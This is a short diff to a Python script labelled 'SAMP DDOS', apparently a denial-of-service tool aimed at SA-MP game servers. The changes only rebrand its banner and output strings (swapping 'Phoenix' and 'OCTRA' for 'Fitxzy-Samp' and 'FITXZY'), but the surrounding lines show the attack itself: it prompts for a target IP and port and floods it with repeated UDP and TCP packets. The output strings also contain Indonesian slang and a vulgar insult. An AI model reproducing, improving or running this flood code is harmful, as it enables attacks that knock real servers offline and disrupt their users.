@@ -6,7 +6,7 @@ import os
 import sys
 
 os.system("clear")
-print("Tools by Phoenix")
+print("Tools Ddos By Fitxzy-Samp")
 print("#-- SAMP DDOS --#")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
@@ -22,7 +22,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" PAKET FROM FITXZY NIH DEK")
 		except:
 			print("YAH GAK KUAT KONTOL")
 
@@ -36,7 +36,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" PAKET FROM FITXZY NIH DEK")
 		except:
 			s.close()
 			print("YAH GAK KUAT KONTOL")
